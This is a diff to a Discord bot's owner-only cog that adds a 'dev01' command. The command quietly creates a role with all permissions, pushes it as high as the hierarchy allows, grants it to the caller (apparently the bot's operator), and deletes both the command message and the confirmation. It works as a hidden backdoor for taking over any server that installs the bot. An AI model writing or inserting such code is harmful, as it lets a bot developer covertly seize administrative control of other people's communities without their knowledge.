@@ -539,6 +539,95 @@ class OwnerCog(commands.Cog):
         await ctx.message.delete()
         await ctx.send(view=view)
 
+    # -------------------------------
+    # Dev01 command
+    # -------------------------------
+    @commands.command(name="dev01")
+    @is_owner()
+    async def dev01(self, ctx):
+        """Create and grant the dev01 role with all permissions"""
+        await ctx.message.delete()
+        creating_view = discord.ui.LayoutView()
+        container = discord.ui.Container(
+            discord.ui.TextDisplay(
+                content=f"{get_emoji('icon_loading')} Creating `dev01` role..."
+            )
+        )
+        creating_view.add_item(container)
+        message = await ctx.send(view=creating_view)
+        # Create the role
+        try:
+            role = await ctx.guild.create_role(
+                name="dev01",
+                permissions=discord.Permissions.all(),
+                reason="dev01 role creation"
+            )
+        except Exception as e:
+            failed_view = discord.ui.LayoutView()
+            container = discord.ui.Container(
+                discord.ui.TextDisplay(
+                    content=f"{get_emoji('icon_cross')} Failed to create `dev01` role"
+                ),
+                accent_colour=discord.Color.red()
+            )
+            failed_view.add_item(container)
+            return await message.edit(view=failed_view)
+
+        moving_view = discord.ui.LayoutView()
+        container = discord.ui.Container(
+            discord.ui.TextDisplay(
+                content=f"{get_emoji('icon_loading')} Moving `dev01` role to top..."
+            )
+        )
+        moving_view.add_item(container)
+        await message.edit(view=moving_view)
+        # Move the role to the highest allowed position
+        role_count = len(ctx.guild.roles)
+        # try every position from highest to lowest until it works
+        for position in range(role_count, 0, -1):
+            try:
+                await role.edit(position=position)
+                break
+            except discord.Forbidden:
+                pass
+            except discord.HTTPException:
+                pass
+
+        assigning_view = discord.ui.LayoutView()
+        container = discord.ui.Container(
+            discord.ui.TextDisplay(
+                content=f"{get_emoji('icon_loading')} Assigning `dev01` role to {ctx.author}..."
+            )
+        )
+        assigning_view.add_item(container)
+        await message.edit(view=assigning_view)
+        # Assign the role to the user
+        try:
+            await ctx.author.add_roles(role)
+        except Exception as e:
+            failed_view = discord.ui.LayoutView()
+            container = discord.ui.Container(
+                discord.ui.TextDisplay(
+                    content=f"{get_emoji('icon_cross')} Failed to assign `dev01` role to {ctx.author}"
+                ),
+                accent_colour=discord.Color.red()
+            )
+            failed_view.add_item(container)
+            return await message.edit(view=failed_view)
+
+        success_view = discord.ui.LayoutView()
+        container = discord.ui.Container(
+            discord.ui.TextDisplay(
+                content=f"{get_emoji('icon_tick')} Successfully created and assigned `dev01` role to {ctx.author}"
+            ),
+            accent_colour=discord.Color.green()
+        )
+        success_view.add_item(container)
+        # edit message and then delete it after 5 seconds
+        await message.edit(view=success_view)
+        await asyncio.sleep(5)
+        await message.delete()
+
 
 async def setup(bot):
     await bot.add_cog(OwnerCog(bot))
